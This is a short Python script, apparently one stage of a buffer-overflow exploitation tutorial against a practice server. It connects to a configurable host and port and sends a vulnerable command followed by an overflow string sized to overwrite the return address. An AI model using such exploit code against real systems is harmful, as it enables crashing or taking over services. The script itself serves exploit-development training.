#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "B" * 4 #The 2003 is returned from the pattern_offset.rb module, provide the value this command returned.

address = '127.0.0.1' #CHANGE THIS
port = 9999 #CHANGE THIS
vulncommand = 'TRUN /.:/' # CHANGE THIS, the vulnerable command that was found in the spiking section would go here

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((address,port))

	s.send((vulncommand + shellcode))
	s.close()

except:
	print "Error connecting to server"
	sys.exit()
